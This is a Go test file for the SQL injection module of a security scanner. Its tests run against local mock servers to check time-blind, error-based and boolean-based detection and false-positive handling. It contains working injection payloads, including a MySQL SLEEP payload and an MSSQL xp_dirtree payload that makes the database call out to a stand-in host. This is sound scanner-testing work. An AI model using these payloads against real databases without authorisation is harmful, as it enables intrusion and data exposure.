package sqli

import (
	"context"
	"fmt"
	"math/rand/v2"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
)

func TestSQLi_SkipsNonAuthorized(t *testing.T) {
	t.Parallel()
	s := New()
	for _, st := range []module.ScanType{module.ScanSurface, module.ScanDeep} {
		findings, err := s.Run(context.Background(), "example.com", st)
		if err != nil {
			t.Fatal(err)
		}
		if len(findings) != 0 {
			t.Errorf("SQLi scanner should skip scan type %v", st)
		}
	}
}

func TestSQLi_DetectsTimeBased(t *testing.T) {
	t.Parallel()
	// Create a server that sleeps when it sees SLEEP in the query parameter
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(strings.ToUpper(param), "SLEEP(3)") {
			time.Sleep(3 * time.Second)
		} else if strings.Contains(strings.ToUpper(param), "SLEEP(5)") {
			time.Sleep(5 * time.Second)
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	// Use a generous timeout: error-based probes run first (fast, but many
	// path/param combos), then time-blind needs ~13s per confirmed path
	// (5 baseline + 3s sleep + 5s sleep).
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	// Filter to time-blind findings specifically
	var timeBased []finding.Finding
	for _, f := range findings {
		if ev, ok := f.Evidence["method"]; ok && ev == "time-blind" {
			timeBased = append(timeBased, f)
		}
	}

	if len(timeBased) == 0 {
		t.Fatal("expected time-blind SQLi finding for vulnerable server")
	}

	f := timeBased[0]
	if f.CheckID != "web.sqli" {
		t.Errorf("expected check ID web.sqli, got %s", f.CheckID)
	}
	if f.Severity != finding.SeverityCritical {
		t.Errorf("expected critical severity, got %s", f.Severity)
	}
	if f.Confidence != finding.ConfidenceVerified {
		t.Errorf("expected confidence verified, got %s", f.Confidence)
	}

	// Verify evidence contains timing data
	if _, ok := f.Evidence["baseline_ms"]; !ok {
		t.Error("expected baseline_ms in evidence")
	}
	if _, ok := f.Evidence["sleep3_delta_ms"]; !ok {
		t.Error("expected sleep3_delta_ms in evidence")
	}
	if _, ok := f.Evidence["sleep5_delta_ms"]; !ok {
		t.Error("expected sleep5_delta_ms in evidence")
	}
	if f.Evidence["method"] != "time-blind" {
		t.Errorf("expected method time-blind, got %v", f.Evidence["method"])
	}
}

func TestSQLi_DetectsErrorBased_MySQL(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(param, "'") {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte("ERROR: You have an error in your SQL syntax near '1'' at line 1"))
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	// Should find at least one error-based finding
	var errorBased []finding.Finding
	for _, f := range findings {
		if ev, ok := f.Evidence["method"]; ok && ev == "error-based" {
			errorBased = append(errorBased, f)
		}
	}
	if len(errorBased) == 0 {
		t.Fatal("expected at least one error-based SQLi finding")
	}

	f := errorBased[0]
	if f.CheckID != "web.sqli" {
		t.Errorf("expected check ID web.sqli, got %s", f.CheckID)
	}
	if f.Confidence != finding.ConfidenceVerified {
		t.Errorf("expected confidence verified, got %s", f.Confidence)
	}
	if f.Evidence["db_type"] != "mysql" {
		t.Errorf("expected db_type mysql, got %v", f.Evidence["db_type"])
	}
}

func TestSQLi_DetectsErrorBased_SQLite(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(param, "'") {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`{"error": "unrecognized token: \"1'\""}`))
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"data": []}`))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	var errorBased []finding.Finding
	for _, f := range findings {
		if ev, ok := f.Evidence["method"]; ok && ev == "error-based" {
			errorBased = append(errorBased, f)
		}
	}
	if len(errorBased) == 0 {
		t.Fatal("expected at least one error-based SQLi finding for SQLite")
	}
	if errorBased[0].Evidence["db_type"] != "sqlite" {
		t.Errorf("expected db_type sqlite, got %v", errorBased[0].Evidence["db_type"])
	}
}

func TestSQLi_DetectsErrorBased_Postgres(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(param, "'") {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`ERROR: syntax error at or near "1'"`))
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	var errorBased []finding.Finding
	for _, f := range findings {
		if ev, ok := f.Evidence["method"]; ok && ev == "error-based" {
			errorBased = append(errorBased, f)
		}
	}
	if len(errorBased) == 0 {
		t.Fatal("expected at least one error-based SQLi finding for PostgreSQL")
	}
	if errorBased[0].Evidence["db_type"] != "postgres" {
		t.Errorf("expected db_type postgres, got %v", errorBased[0].Evidence["db_type"])
	}
}

func TestSQLi_DetectsBooleanBased(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(param, "OR") {
			// Boolean tautology returns much more data
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(strings.Repeat("row data\n", 200)))
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("single row"))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	var boolBased []finding.Finding
	for _, f := range findings {
		if ev, ok := f.Evidence["method"]; ok && ev == "boolean-based" {
			boolBased = append(boolBased, f)
		}
	}
	if len(boolBased) == 0 {
		t.Fatal("expected at least one boolean-based SQLi finding")
	}
	if boolBased[0].Confidence != finding.ConfidenceProbable {
		t.Errorf("expected confidence probable, got %s", boolBased[0].Confidence)
	}
}

func TestSQLi_ErrorBasedNoFalsePositive(t *testing.T) {
	t.Parallel()
	// Server that never reflects SQL errors — should not trigger error-based detection
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	host := ts.Listener.Addr().String()
	f := probeErrorBased(context.Background(), client, "http", host, "/", "id")
	if f != nil {
		t.Errorf("expected no finding for clean server, got: %s", f.Title)
	}
}

func TestProbeErrorBased_MatchesPatterns(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		body     string
		wantDB   string
	}{
		{"mysql", "You have an error in your SQL syntax near '1''", "mysql"},
		{"postgres", "ERROR: syntax error at or near \"1'\"", "postgres"},
		{"sqlite", "SQLITE_ERROR: no such column", "sqlite"},
		{"mssql", "Unclosed quotation mark after the character string", "mssql"},
		{"generic-sql-syntax", "SQL syntax error in query", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				param := r.URL.Query().Get("id")
				if strings.Contains(param, "'") {
					w.WriteHeader(http.StatusInternalServerError)
					_, _ = w.Write([]byte(tt.body))
					return
				}
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte("OK"))
			}))
			defer ts.Close()

			client := &http.Client{Timeout: 5 * time.Second}
			host := ts.Listener.Addr().String()
			f := probeErrorBased(context.Background(), client, "http", host, "/", "id")
			if f == nil {
				t.Fatalf("expected error-based finding for %s pattern", tt.name)
			}
			if f.Evidence["db_type"] != tt.wantDB {
				t.Errorf("expected db_type %s, got %v", tt.wantDB, f.Evidence["db_type"])
			}
		})
	}
}

func TestBodyLengthDiff(t *testing.T) {
	t.Parallel()
	tests := []struct {
		a, b string
		want float64
	}{
		{"", "", 0.0},
		{"abc", "abc", 0.0},
		{"a", "abcde", 0.8},
		{"abcdefghij", "ab", 0.8},
	}
	for _, tt := range tests {
		got := bodyLengthDiff(tt.a, tt.b)
		if diff := got - tt.want; diff > 0.01 || diff < -0.01 {
			t.Errorf("bodyLengthDiff(%q, %q) = %f, want %f", tt.a, tt.b, got, tt.want)
		}
	}
}

func TestSQLi_NoFalsePositiveConstantTime(t *testing.T) {
	t.Parallel()
	// Server with constant response time — should not trigger
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for constant-time server, got %d", len(findings))
	}
}

func TestSQLi_NoFalsePositiveJitter(t *testing.T) {
	t.Parallel()
	// Server with random jitter (0-500ms) — should not trigger because
	// deltas won't consistently reach 2.5s+ and 4.5s+.
	// Use a 30s context timeout: enough for the scanner to probe a few
	// path/param combos (which confirms no false positives from jitter)
	// without iterating the full matrix (~1100 requests × 500ms = too slow).
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(time.Duration(rand.IntN(500)) * time.Millisecond)
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("OK"))
	}))
	defer ts.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for jittery server, got %d", len(findings))
	}
}

func TestBuildPayload(t *testing.T) {
	p := payload{
		name:    "mysql-sleep-quote",
		dbType:  "mysql",
		prefix:  "' OR SLEEP(",
		sleepFn: "%d",
		suffix:  ")-- -",
	}

	got := buildPayload(p, 3)
	want := "' OR SLEEP(3)-- -"
	if got != want {
		t.Errorf("buildPayload() = %q, want %q", got, want)
	}

	got = buildPayload(p, 5)
	want = "' OR SLEEP(5)-- -"
	if got != want {
		t.Errorf("buildPayload(5) = %q, want %q", got, want)
	}
}

func TestMeasureBaseline(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	baseline, err := measureBaseline(context.Background(), client, ts.URL, 5)
	if err != nil {
		t.Fatal(err)
	}

	// Baseline to localhost should be under 100ms
	if baseline > 100*time.Millisecond {
		t.Errorf("baseline %s seems too high for localhost", baseline)
	}
}

func TestTimeRequest(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(50 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	elapsed, err := timeRequest(context.Background(), client, ts.URL)
	if err != nil {
		t.Fatal(err)
	}

	if elapsed < 50*time.Millisecond {
		t.Errorf("expected at least 50ms, got %s", elapsed)
	}
}

func TestSQLi_OOBIntegration(t *testing.T) {
	t.Parallel()
	// Verify OOB tokens are generated when server is available and scanner
	// doesn't panic. Uses a short timeout — we only need to exercise the OOB
	// code path, not iterate all payloads.
	oobSrv := oob.NewServer("oob.test.com", "127.0.0.1:0")
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	ctx = oob.WithOOB(ctx, oobSrv)

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	s := New()
	host := ts.Listener.Addr().String()
	// Won't find anything (no actual SQLi) but should not panic
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil && ctx.Err() == nil {
		t.Fatal(err)
	}
	// No findings expected since server doesn't actually execute SQL
	_ = findings
}

func TestSQLi_OOBPayloadFormat(t *testing.T) {
	// Verify the MSSQL xp_dirtree OOB payload produces a valid UNC path,
	// not a BEL character (\a = 0x07).
	domain := "oob.example.com"

	// Reproduce the format string from the scanner
	mssqlPayload := fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", domain)

	// The Go string should contain \\\\domain\\a (SQL-escaped UNC path).
	// When the SQL server interprets the string literal, \\\\ → \\, \\ → \,
	// producing the UNC path \\domain\a.
	wantSQLEscaped := `\\\\` + domain + `\\a`
	if !strings.Contains(mssqlPayload, wantSQLEscaped) {
		t.Errorf("MSSQL OOB payload should contain SQL-escaped UNC path %q, got: %q", wantSQLEscaped, mssqlPayload)
	}
	// Must NOT contain a BEL character (0x07)
	if strings.ContainsRune(mssqlPayload, 0x07) {
		t.Error("MSSQL OOB payload contains BEL character (0x07), expected literal backslash-a")
	}
}

func TestDetectScheme(t *testing.T) {
	t.Parallel()
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	host := ts.Listener.Addr().String()

	scheme := detectScheme(context.Background(), client, host)
	if scheme != "http" {
		t.Errorf("expected http for httptest server, got %s", scheme)
	}
}
